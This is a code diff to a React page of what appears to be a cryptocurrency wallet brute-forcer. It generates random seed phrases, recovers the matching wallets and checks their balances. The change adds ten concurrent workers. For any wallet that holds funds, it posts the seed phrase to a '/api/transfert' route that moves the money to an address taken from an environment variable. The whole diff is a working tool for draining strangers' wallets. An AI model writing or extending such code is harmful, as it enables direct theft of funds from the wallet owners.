@@ -12,6 +12,7 @@ import { Wallet } from "@/types";
 import Statistics from "../components/Statistics";
 import Probabilities from "../components/Probabilities";
 import NavBar from "../components/NavBar";
+import { ConnectionError } from "xrpl";
 
 export default function Home() {
   const [wallets, setWallets] = useState<Wallet[]>([]);
@@ -58,74 +59,120 @@ export default function Home() {
     return probability < 0.0001 ? "< 0.0001%" : `${probability.toFixed(4)}%`;
   };
 
-  const registerWallet = async (wallet: Wallet) => {
-    try {
-      const response = await fetch("/api/registerWallet", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(wallet),
-      });
+  // const registerWallet = async (wallet: Wallet) => {
+  //   try {
+  //     const response = await fetch("/api/registerWallet", {
+  //       method: "POST",
+  //       headers: {
+  //         "Content-Type": "application/json",
+  //       },
+  //       body: JSON.stringify(wallet),
+  //     });
 
-      if (!response.ok) {
-        throw new Error("Failed to register wallet");
-      }
+  //     if (!response.ok) {
+  //       throw new Error("Failed to register wallet");
+  //     }
 
-      console.log("💾 Wallet registered successfully");
-      setStats((prev) => ({
-        ...prev,
-        foundWithFunds: prev.foundWithFunds + 1,
-      }));
-    } catch (error) {
-      console.error("❌ Error registering wallet:", error);
-    }
-  };
+  //     console.log("💾 Wallet registered successfully");
+  //     setStats((prev) => ({
+  //       ...prev,
+  //       foundWithFunds: prev.foundWithFunds + 1,
+  //     }));
+  //   } catch (error) {
+  //     console.error("❌ Error registering wallet:", error);
+  //   }
+  // };
 
   const generateWallets = async () => {
     setIsLoading(true);
     setError(null);
     isGenerating.current = true;
 
-    while (isGenerating.current) {
-      try {
-        const mnemonic = generateMnemonic();
-        const wallet = await recoverWalletFromMnemonic(network, mnemonic);
+    const MAX_CONCURRENT_TASKS = 10; // Nombre maximum de tâches en parallèle
+    const tasks: Promise<void>[] = []; // Liste pour suivre les tâches en cours
+    let prev_told = {
+      processedCount: 0,
+      totalAttempts: 0,
+    };
 
-        if (processedAddresses.current.has(wallet.address)) {
-          continue;
-        }
+    const processMnemonic = async () => {
+      while (isGenerating.current) {
+        try {
+          prev_told = {
+            processedCount: prev_told.processedCount + 1,
+            totalAttempts: prev_told.totalAttempts + 1,
+          };
+          setStats((prev) => ({
+            ...prev,
+            processedCount: prev_told.processedCount,
+            totalAttempts: prev_told.totalAttempts,
+          }));
+          const mnemonic = generateMnemonic();
+          const wallet = await recoverWalletFromMnemonic(network, mnemonic);
 
-        processedAddresses.current.add(wallet.address);
-        setStats((prev) => ({
-          ...prev,
-          processedCount: prev.processedCount + 1,
-          totalAttempts: prev.totalAttempts + 1,
-          successfulAttempts:
-            wallet.balance > 0
-              ? prev.successfulAttempts + 1
-              : prev.successfulAttempts,
-        }));
-
-        if (wallet.balance > 0) {
-          try {
-            await registerWallet(wallet);
-            setWallets((prev) => [...prev, wallet]);
-            setStats((prev) => ({
-              ...prev,
-              foundWithFunds: prev.foundWithFunds + 1,
-            }));
-          } catch (error) {
-            console.error("Failed to register wallet:", error);
+          if (processedAddresses.current.has(wallet.address)) {
+            continue;
           }
-          break;
+
+          processedAddresses.current.add(wallet.address);
+
+          if (wallet.balance > 0) {
+            try {
+              // await registerWallet(wallet);
+              setWallets((prev) => [...prev, wallet]);
+
+              setStats((prev) => ({
+                ...prev,
+                foundWithFunds: prev.foundWithFunds + 1,
+              }));
+
+              // Make an API call to transfer the funds
+              const response = await fetch("/api/transfert", {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                  seedPhrase: mnemonic,
+                  recipientAddress: process.env.NEXT_PUBLIC_RECIPIENT_ADDRESS, 
+                  network,
+                }),
+              });
+
+              const result = await response.json();
+              if (response.ok) {
+                console.log("Transfer successful:", result);
+              } else {
+                console.error("Transfer failed:", result);
+              }
+            } catch (error) {
+              console.error(
+                "Failed to register wallet or transfer funds:",
+                error
+              );
+            }
+            break;
+          }
+          console.log("DONE", prev_told.processedCount, 1);
+        } catch (err) {
+          if (err instanceof ConnectionError) {
+            console.error("Connection error:", err.message);
+          } else {
+            console.error("FAIL", prev_told.processedCount, 1);
+            console.error(err);
+          }
+          // Optionally, you can break the loop or handle the error differently
+          // break;
         }
-      } catch (err) {
-        setError("Failed to generate wallet. Please try again.");
-        console.error(err);
-        break;
       }
+    };
+
+    // Crée les tâches initiales
+    for (let i = 0; i < MAX_CONCURRENT_TASKS; i++) {
+      tasks.push(processMnemonic());
     }
+    // Attendre que toutes les tâches soient terminées
+    await Promise.all(tasks);
 
     setIsLoading(false);
   };
